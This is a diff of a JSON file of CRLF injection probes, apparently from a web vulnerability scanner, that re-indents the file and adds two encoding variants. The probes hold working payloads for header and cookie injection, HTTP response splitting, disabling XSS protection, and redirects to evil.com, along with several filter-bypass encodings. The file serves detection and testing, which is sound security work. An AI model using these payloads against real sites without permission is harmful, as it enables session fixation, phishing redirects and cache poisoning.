@@ -1,217 +1,243 @@
 {
- "category": "crlf_injection",
- "chain_with": [
-  "xss",
-  "cache_poisoning",
-  "open_redirect"
- ],
- "contexts": {
-  "header_injection": {
-   "description": "CRLF injection to inject HTTP headers",
-   "tech_match": [],
-   "param_match": [
-    "url",
-    "redirect",
-    "return",
-    "next",
-    "goto",
-    "dest",
-    "host",
-    "header",
-    "ref"
-   ],
-   "probes": [
-    {
-     "payload": "{{baseline}}%0d%0aX-Injected: true",
-     "description": "CRLF header injection via %0d%0a",
-     "matchers": [
-      {
-       "type": "header",
-       "name": "X-Injected",
-       "contains": "true"
-      }
-     ],
-     "severity": "high",
-     "confidence_boost": 45
+  "category": "crlf_injection",
+  "chain_with": [
+    "xss",
+    "cache_poisoning",
+    "open_redirect"
+  ],
+  "contexts": {
+    "header_injection": {
+      "description": "CRLF injection to inject HTTP headers",
+      "tech_match": [],
+      "param_match": [
+        "url",
+        "redirect",
+        "return",
+        "next",
+        "goto",
+        "dest",
+        "host",
+        "header",
+        "ref"
+      ],
+      "probes": [
+        {
+          "payload": "{{baseline}}%0d%0aX-Injected: true",
+          "description": "CRLF header injection via %0d%0a",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "X-Injected",
+              "contains": "true"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "{{baseline}}%0d%0a%0d%0a<swk-crlf-{{marker}}>",
+          "description": "CRLF to HTTP response splitting \u2014 unique marker tag in double-CRLF body split; reflection confirms header injection escalated to body control",
+          "matchers": [
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "{{baseline}}\\r\\nSet-Cookie: evil=true",
+          "description": "CRLF cookie injection via literal \\r\\n",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Set-Cookie",
+              "contains": "evil"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "{{baseline}}%0d%0aSet-Cookie: admin=true",
+          "description": "CRLF cookie injection via URL-encoded CRLF \u2014 inject admin cookie",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Set-Cookie",
+              "contains": "admin"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "{{baseline}}%0d%0aLocation: https://swktest-{{marker}}.evil.example",
+          "description": "CRLF redirect injection \u2014 inject Location header with unique marker to redirect victim",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Location",
+              "contains": "swktest-"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "{{baseline}}%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aX-SWK-Split: {{marker}}%0d%0a%0d%0aswk-split-{{marker}}",
+          "description": "HTTP response splitting \u2014 inject fake second HTTP response with unique marker; X-SWK-Split header in response confirms full splitting",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "X-SWK-Split",
+              "contains": "swk"
+            },
+            {
+              "type": "word",
+              "words": [
+                "swk-split-"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "{{baseline}}%E5%98%8A%E5%98%8DX-Injected: true",
+          "description": "UTF-8 overlong CRLF bypass \u2014 %E5%98%8A/%E5%98%8D normalize to LF/CR after charset decode, bypassing filters that only reject literal \\r\\n (Apache HttpClient class).",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "X-Injected",
+              "contains": "true"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "{{baseline}}%250d%250aX-Injected: true",
+          "description": "Double-URL-encoded CRLF \u2014 %250d%250a decodes to %0d%0a on a second decode pass, bypassing single-decode sanitizers.",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "X-Injected",
+              "contains": "true"
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "{{baseline}}%0aX-Injected: true",
+          "description": "Bare-LF header injection \u2014 some servers/proxies accept LF-only line terminators, splitting the header without a CR.",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "X-Injected",
+              "contains": "true"
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "{{baseline}}%0d%0aSet-Cookie: crlf_poc=1",
+          "description": "CRLF Set-Cookie injection \u2014 attacker-controlled cookie (session fixation / overwrite / scope confusion).",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Set-Cookie",
+              "contains": "crlf_poc"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "{{baseline}}%0d%0aX-XSS-Protection: 0%0d%0aContent-Type: text/html",
+          "description": "CRLF response-splitting \u2014 inject X-XSS-Protection:0 and override Content-Type, enabling reflected-XSS payloads split into the body.",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "X-XSS-Protection",
+              "contains": "0"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "{{baseline}}%0d%0aLocation: https://evil.com",
+          "description": "CRLF Location injection \u2014 forces an open redirect via an injected Location response header (chain: phishing / OAuth token theft).",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Location",
+              "contains": "evil.com"
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "{{baseline}}%25%30%61X-Injected:%20true",
+          "description": "Double-encoded %0a (%25%30%61) \u2014 fires when app URL-decodes twice",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "X-Injected",
+              "contains": "true"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "{{baseline}}%u000aX-Injected:%20true",
+          "description": "IIS/.NET %u000a unicode newline CRLF injection",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "X-Injected",
+              "contains": "true"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 40
+        }
+      ]
     },
-    {
-     "payload": "{{baseline}}%0d%0a%0d%0a<swk-crlf-{{marker}}>",
-     "description": "CRLF to HTTP response splitting \u2014 unique marker tag in double-CRLF body split; reflection confirms header injection escalated to body control",
-     "matchers": [
-      {
-       "type": "reflection",
-       "check_variants": true
-      }
-     ],
-     "severity": "critical",
-     "confidence_boost": 50
-    },
-    {
-     "payload": "{{baseline}}\\r\\nSet-Cookie: evil=true",
-     "description": "CRLF cookie injection via literal \\r\\n",
-     "matchers": [
-      {
-       "type": "header",
-       "name": "Set-Cookie",
-       "contains": "evil"
-      }
-     ],
-     "severity": "high",
-     "confidence_boost": 40
-    },
-    {
-     "payload": "{{baseline}}%0d%0aSet-Cookie: admin=true",
-     "description": "CRLF cookie injection via URL-encoded CRLF \u2014 inject admin cookie",
-     "matchers": [
-      {
-       "type": "header",
-       "name": "Set-Cookie",
-       "contains": "admin"
-      }
-     ],
-     "severity": "critical",
-     "confidence_boost": 50
-    },
-    {
-     "payload": "{{baseline}}%0d%0aLocation: https://swktest-{{marker}}.evil.example",
-     "description": "CRLF redirect injection \u2014 inject Location header with unique marker to redirect victim",
-     "matchers": [
-      {
-       "type": "header",
-       "name": "Location",
-       "contains": "swktest-"
-      }
-     ],
-     "severity": "high",
-     "confidence_boost": 45
-    },
-    {
-     "payload": "{{baseline}}%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aX-SWK-Split: {{marker}}%0d%0a%0d%0aswk-split-{{marker}}",
-     "description": "HTTP response splitting \u2014 inject fake second HTTP response with unique marker; X-SWK-Split header in response confirms full splitting",
-     "matchers": [
-      {
-       "type": "header",
-       "name": "X-SWK-Split",
-       "contains": "swk"
-      },
-      {
-       "type": "word",
-       "words": [
-        "swk-split-"
-       ],
-       "condition": "or"
-      }
-     ],
-     "severity": "critical",
-     "confidence_boost": 50
-    },
-    {
-     "payload": "{{baseline}}%E5%98%8A%E5%98%8DX-Injected: true",
-     "description": "UTF-8 overlong CRLF bypass \u2014 %E5%98%8A/%E5%98%8D normalize to LF/CR after charset decode, bypassing filters that only reject literal \\r\\n (Apache HttpClient class).",
-     "matchers": [
-      {
-       "type": "header",
-       "name": "X-Injected",
-       "contains": "true"
-      }
-     ],
-     "severity": "high",
-     "confidence_boost": 55
-    },
-    {
-     "payload": "{{baseline}}%250d%250aX-Injected: true",
-     "description": "Double-URL-encoded CRLF \u2014 %250d%250a decodes to %0d%0a on a second decode pass, bypassing single-decode sanitizers.",
-     "matchers": [
-      {
-       "type": "header",
-       "name": "X-Injected",
-       "contains": "true"
-      }
-     ],
-     "severity": "medium",
-     "confidence_boost": 40
-    },
-    {
-     "payload": "{{baseline}}%0aX-Injected: true",
-     "description": "Bare-LF header injection \u2014 some servers/proxies accept LF-only line terminators, splitting the header without a CR.",
-     "matchers": [
-      {
-       "type": "header",
-       "name": "X-Injected",
-       "contains": "true"
-      }
-     ],
-     "severity": "medium",
-     "confidence_boost": 40
-    },
-    {
-     "payload": "{{baseline}}%0d%0aSet-Cookie: crlf_poc=1",
-     "description": "CRLF Set-Cookie injection \u2014 attacker-controlled cookie (session fixation / overwrite / scope confusion).",
-     "matchers": [
-      {
-       "type": "header",
-       "name": "Set-Cookie",
-       "contains": "crlf_poc"
-      }
-     ],
-     "severity": "high",
-     "confidence_boost": 55
-    },
-    {
-     "payload": "{{baseline}}%0d%0aX-XSS-Protection: 0%0d%0aContent-Type: text/html",
-     "description": "CRLF response-splitting \u2014 inject X-XSS-Protection:0 and override Content-Type, enabling reflected-XSS payloads split into the body.",
-     "matchers": [
-      {
-       "type": "header",
-       "name": "X-XSS-Protection",
-       "contains": "0"
-      }
-     ],
-     "severity": "high",
-     "confidence_boost": 50
-    },
-    {
-     "payload": "{{baseline}}%0d%0aLocation: https://evil.com",
-     "description": "CRLF Location injection \u2014 forces an open redirect via an injected Location response header (chain: phishing / OAuth token theft).",
-     "matchers": [
-      {
-       "type": "header",
-       "name": "Location",
-       "contains": "evil.com"
-      }
-     ],
-     "severity": "medium",
-     "confidence_boost": 45
+    "log_injection": {
+      "description": "CRLF log injection \u2014 inject fake log entries if logs are reflected or exposed",
+      "tech_match": [],
+      "param_match": [
+        "user",
+        "username",
+        "name",
+        "q",
+        "search",
+        "input",
+        "url",
+        "redirect"
+      ],
+      "probes": [
+        {
+          "payload": "{{baseline}}%0d%0a[CRITICAL] swk-log-inject-{{marker}}",
+          "description": "CRLF log injection \u2014 unique marker in fake log entry; reflection confirms CRLF injection into log output",
+          "matchers": [
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 25
+        }
+      ]
     }
-   ]
-  },
-  "log_injection": {
-   "description": "CRLF log injection \u2014 inject fake log entries if logs are reflected or exposed",
-   "tech_match": [],
-   "param_match": [
-    "user",
-    "username",
-    "name",
-    "q",
-    "search",
-    "input",
-    "url",
-    "redirect"
-   ],
-   "probes": [
-    {
-     "payload": "{{baseline}}%0d%0a[CRITICAL] swk-log-inject-{{marker}}",
-     "description": "CRLF log injection \u2014 unique marker in fake log entry; reflection confirms CRLF injection into log output",
-     "matchers": [
-      {
-       "type": "reflection",
-       "check_variants": true
-      }
-     ],
-     "severity": "medium",
-     "confidence_boost": 25
-    }
-   ]
   }
- }
 }
